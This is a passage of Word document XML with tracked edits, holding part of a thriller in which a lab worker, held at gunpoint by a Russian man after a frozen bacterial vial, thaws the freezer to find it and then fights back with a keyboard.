      </w:r>
      <w:ins w:id="1153" w:author="TextVet" w:date="2016-03-17T15:10:00Z">
        <w:r w:rsidR="00C441DA">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matching </w:t>
      </w:r>
      <w:ins w:id="1154" w:author="TextVet" w:date="2016-03-17T15:10:00Z">
        <w:r w:rsidR="00C441DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>each’s</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1155" w:author="TextVet" w:date="2016-03-17T15:10:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00C441DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>its</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> position in the case. The labels all bore some researcher’s initials, a date, a batch number, and similar figures. She could find no pattern among them, and nothing distinct about any</w:t>
      </w:r>
      <w:del w:id="1156" w:author="TextVet" w:date="2016-03-17T15:13:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00FC4CCA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> particular one</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watched her stack the tubes into precise</w:t>
      </w:r>
      <w:ins w:id="1157" w:author="TextVet" w:date="2016-03-17T15:13:00Z">
        <w:r w:rsidR="005F5B25">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organized lines on the table. With a squint, he asked, “This will help you find what I want?”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No, it’s…” Tina stammered as she tried to multitask between arranging the tubes and talking to her captor. “Everything in the fridge is organized by location. If I put these back out of order, I’ll ruin all the scientists’ projects.”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shrugged dismissively. “Why put back at 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I </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>have</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> to put them back or else they’ll die,” Tina insisted. “The brown stuff in the vials is bacteria frozen in glycerol. They’re living things. They can’t live in the suspension. The glycerol protects them from ice when they</w:t>
      </w:r>
      <w:ins w:id="1158" w:author="TextVet" w:date="2016-03-17T15:15:00Z">
        <w:r w:rsidR="001E1BE1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>’</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1159" w:author="TextVet" w:date="2016-03-17T15:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001E1BE1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1160" w:author="TextVet" w:date="2016-03-17T15:14:00Z">
        <w:r w:rsidR="001E1BE1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>re</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1161" w:author="TextVet" w:date="2016-03-17T15:14:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="001E1BE1">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>get</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> frozen, but they need water and food. If they come out of suspended animation in the glycerol, they’ll…”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looked back and forth between the freezer, her precise little row of test tubes, and his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what?” she said. “Fuck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stepped toward the cryogenic storage unit, but didn’t touch the door. Instead, she slid her body against the side of the machine’s massive bulk, toward the wall. Behind the freezer, beneath the thrumming compressor pumps and condenser coils, </w:t>
      </w:r>
      <w:del w:id="1162" w:author="TextVet" w:date="2016-03-17T15:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008847DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">was </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">a thick black cable </w:t>
      </w:r>
      <w:del w:id="1163" w:author="TextVet" w:date="2016-03-17T15:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008847DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1164" w:author="TextVet" w:date="2016-03-17T15:16:00Z">
        <w:r w:rsidR="00F625D4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>serpented</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1165" w:author="TextVet" w:date="2016-03-17T15:16:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00F625D4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>ran</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> to a heavy power plug. Tina reached down behind the machine, welcoming the warm air blowing from the condenser fans, and grabbed it. With a yank, she dislodged the plug from its wall socket. The refrigeration machinery fell silent.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monitoring terminal lit up in a panicking flurry of bright green</w:t>
      </w:r>
      <w:ins w:id="1166" w:author="TextVet" w:date="2016-03-17T15:17:00Z">
        <w:r w:rsidR="000C0C1D">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all-caps alert messages. Tina grabbed the freezer’s door handle one last time and pulled it wide open, letting the unit’s cold air spill freely out into the room. She stood back far enough to avoid the draft, and watched the terminal as its temperature readout climbed.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 wasn’t long before the cases could be comfortably touched with bare hands. She grabbed them two at a time, pulled them from their slippery racks, and set them on the </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">table. Melting frost dripped down their sides, </w:t>
      </w:r>
      <w:del w:id="1167" w:author="TextVet" w:date="2016-03-17T15:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00156055">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">forming small </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>p</w:t>
      </w:r>
      <w:del w:id="1168" w:author="TextVet" w:date="2016-03-17T15:18:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00156055">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>uddles</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1169" w:author="TextVet" w:date="2016-03-17T15:18:00Z">
        <w:r w:rsidR="00156055">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>ooling</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> on the tabletop. She opened their lids and pulled out vial after vial, giving each label a quick examination before tossing it down into a discard pile.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one vial that bore visibly less frost on its cap</w:t>
      </w:r>
      <w:del w:id="1170" w:author="TextVet" w:date="2016-03-17T15:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="008718DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> than the others</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> — it had clearly been withdrawn from its box often. Tina drew it out, and knew immediately that it was the one </w:t>
      </w:r>
      <w:del w:id="1171" w:author="TextVet" w:date="2016-03-17T15:19:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="004618C4">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve">that </w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>the Russian had come for. In place of a label, this vial had a tattered yellow smiley face sticker affixed on its translucent surface.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perked up as he saw her lay it on the table. He slid his cellphone into his pocket, stepped forward eagerly, and picked up the tube with the tips of his gloved fingers.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“Are we done here?” Tina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man held the vial </w:t>
      </w:r>
      <w:ins w:id="1172" w:author="TextVet" w:date="2016-03-17T15:20:00Z">
        <w:r w:rsidR="00AC06F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>to</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1173" w:author="TextVet" w:date="2016-03-17T15:20:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00AC06F0">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>in front of</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> his face. His grin echoed the smile on the round yellow sticker. “Yes. I think we are.”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“Good,” she said, already halfway to the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didn’t make</w:t>
      </w:r>
      <w:ins w:id="1174" w:author="TextVet" w:date="2016-03-17T15:20:00Z">
        <w:r w:rsidR="00D43C44">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> it</w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>. A leather-gloved hand clamped around her wrist and jerked her back. “Not so fast, young lady.”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Let me go!” she demanded.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“You’re quite useful, you know,” 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“You said we’re </w:t>
      </w:r>
      <w:r w:rsidR="00566952" w:rsidRPr="00566952">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:rPrChange w:id="1175" w:author="TextVet" w:date="2016-03-17T15:21:00Z">
            <w:rPr>
              <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
              <w:color w:val="000000"/>
              <w:sz w:val="24"/>
              <w:szCs w:val="24"/>
            </w:rPr>
          </w:rPrChange>
        </w:rPr>
        <w:t>done</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> here!” She struggled, but to no avail. He held her wrist with his left hand, balancing his gun and the vial in his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 are done </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>here</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>,” repeated the man. “But… I have more use for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felt her stomach lurch. “Fuck you, </w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>no</w:t>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>!” she screamed, fighting against his grip with all her might.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yanked her back into the room and released her, letting her momentum carry her a few stumbling steps.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“Relax,” he said in a commanding tone. “Do not assume things, lady. I am a professional. I don’t mix business with pleasure. Besides, I get hotter pieces of ass than you any time I want. Your body is of no interest to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stared at him silently</w:t>
      </w:r>
      <w:ins w:id="1176" w:author="TextVet" w:date="2016-03-17T15:22:00Z">
        <w:r w:rsidR="00B205DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1177" w:author="TextVet" w:date="2016-03-17T15:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B205DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>.</w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="1178" w:author="TextVet" w:date="2016-03-17T15:22:00Z">
        <w:r w:rsidR="00B205DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1179" w:author="TextVet" w:date="2016-03-17T15:23:00Z">
        <w:r w:rsidR="00B205DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>w</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1180" w:author="TextVet" w:date="2016-03-17T15:22:00Z">
        <w:r w:rsidR="00B205DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>eather</w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1181" w:author="TextVet" w:date="2016-03-17T15:23:00Z">
        <w:r w:rsidR="000E5281">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> </w:t>
        </w:r>
        <w:r w:rsidR="00B205DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">fronts of relief and offence </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1182" w:author="TextVet" w:date="2016-03-17T15:24:00Z">
        <w:r w:rsidR="000E5281">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve">suddenly </w:t>
        </w:r>
      </w:ins>
      <w:ins w:id="1183" w:author="TextVet" w:date="2016-03-17T15:23:00Z">
        <w:r w:rsidR="000E5281">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>meeting</w:t>
        </w:r>
        <w:r w:rsidR="00B205DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t xml:space="preserve"> within her</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1184" w:author="TextVet" w:date="2016-03-17T15:23:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B205DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> She found herself feeling relieved and offended</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1185" w:author="TextVet" w:date="2016-03-17T15:22:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00B205DA">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> at the same time</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“You are proving handy to have around,” he said. “Besides…” He gestured with the vial. “I need to make sure you did not pull any funny business with this tube. I need the stuff in here to come out alive. And that means you need to give me… insurance.”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gulped quietly.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here is a plan,” he continued. “We take you back to our factory. Your little friend is there — she will be happy to see you. We keep you until we finish a good batch and see that everything works. It should only take a few days. Nobody will hurt you. And when you get success, we let you go.”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have got to be kidding me,” Tina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“Stop arguing already! Cooperate and things go well for you. We are businessmen, not animals. Now come on!” He waved the gun at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sound of his voice began to recede, like she was hearing it underwater. She felt her skin crawl as goosebumps rose. She looked furtively around the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few feet away from her</w:t>
      </w:r>
      <w:ins w:id="1186" w:author="TextVet" w:date="2016-03-17T15:25:00Z">
        <w:r w:rsidR="00541437">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>,</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1187" w:author="TextVet" w:date="2016-03-17T15:25:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00541437">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> was</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> the old</w:t>
      </w:r>
      <w:ins w:id="1188" w:author="TextVet" w:date="2016-03-17T15:28:00Z">
        <w:r w:rsidR="00541437">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dirty beige freezer</w:t>
      </w:r>
      <w:ins w:id="1189" w:author="TextVet" w:date="2016-03-17T15:26:00Z">
        <w:r w:rsidR="00541437">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:t>-</w:t>
        </w:r>
      </w:ins>
      <w:del w:id="1190" w:author="TextVet" w:date="2016-03-17T15:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00541437">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monitoring terminal with the green screen and the big heavy keyboard</w:t>
      </w:r>
      <w:del w:id="1191" w:author="TextVet" w:date="2016-03-17T15:26:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00541437">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText>. It</w:delText>
        </w:r>
      </w:del>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> was still flashing silent distress about the freezer’s temperature.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“Okay. I’ll do it,”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“Good girl,” he said. “Let’s go.”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need to check the environmental settings for the cold storage unit,” she said, nodding her head toward the terminal. “When we get the tube back to your factory, I’ll need to store it somewhere with the exact same temperature, pressure, and humidity levels.”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grinned again. “See! You’re being useful already!”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stepped slowly toward the terminal, laid her hands upon the keyboard, and made a few meaningless keystrokes. The clunky keys made loud </w:t>
      </w:r>
      <w:commentRangeStart w:id="1192"/>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:i/>
          <w:iCs/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ka-chunk!</w:t>
      </w:r>
      <w:commentRangeEnd w:id="1192"/>
      <w:r w:rsidR="00252FFA">
        <w:rPr>
          <w:rStyle w:val="CommentReference"/>
        </w:rPr>
        <w:commentReference w:id="1192"/>
      </w:r>
      <w:r w:rsidRPr="000D3488">
        <w:rPr>
          <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
          <w:color w:val="000000"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t> sounds beneath her fingers.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“My colleagues and I will show our appreciation of you being so helpful,” the man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squinted at the screen. “Hmm… Damn it,” she said slowly.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 everything alright?” he asked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“This isn’t making any sense,” she said. “Come here, can you take a look at this?” She glanced at him as she beckoned him over. He was still holding both the vial and the revolver in the same hand. That meant his grip on both was probably weak.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stepped toward the terminal and stood right behind her, looking over her shoulder.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“See where it says ‘Temperature’?” she asked, quietly curling her fingers underneath the keyboard’s edges.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he said, leaning forward.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a swift upward jerk, Tina swung the keyboard over her shoulder and smashed it against his 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that split second</w:t>
      </w:r>
      <w:del w:id="1193" w:author="TextVet" w:date="2016-03-17T15:31:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00943FB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
            <w:sz w:val="24"/>
            <w:szCs w:val="24"/>
          </w:rPr>
          <w:delText xml:space="preserve"> of confusio</w:delText>
        </w:r>
      </w:del>
      <w:del w:id="1194" w:author="TextVet" w:date="2016-03-17T15:32:00Z">
        <w:r w:rsidRPr="000D3488" w:rsidDel="00943FB9">
          <w:rPr>
            <w:rFonts w:ascii="Georgia" w:eastAsia="Times New Roman" w:hAnsi="Georgia" w:cs="Times New Roman"/>
            <w:color w:val="000000"/>
